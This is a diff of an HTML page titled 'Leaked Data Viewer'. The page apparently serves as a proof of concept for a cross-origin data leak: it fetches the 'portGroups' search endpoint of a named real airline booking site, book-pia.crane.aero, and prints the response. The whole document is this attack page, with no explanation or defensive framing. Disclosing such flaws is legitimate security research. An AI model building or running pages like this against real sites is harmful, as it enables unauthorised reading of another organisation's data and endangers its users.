@@ -3,10 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Test Page</title>
+    <title>Leaked Data Viewer</title>
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1>Leaked Data from book-pia.crane.aero</h1>
+    <pre id="output">Fetching data...</pre>
 
     <script>
         fetch("https://book-pia.crane.aero/ibe/search/portGroups", {
@@ -15,10 +16,11 @@
         })
         .then(response => response.text())
         .then(data => {
-            console.log("Leaked Data:", data); 
-            document.body.innerHTML = "<pre>" + data + "</pre>";
+            document.getElementById("output").innerText = data;
         })
-        .catch(error => console.error("Error:", error));
+        .catch(error => {
+            document.getElementById("output").innerText = "Error: " + error;
+        });
     </script>
 </body>
 </html>
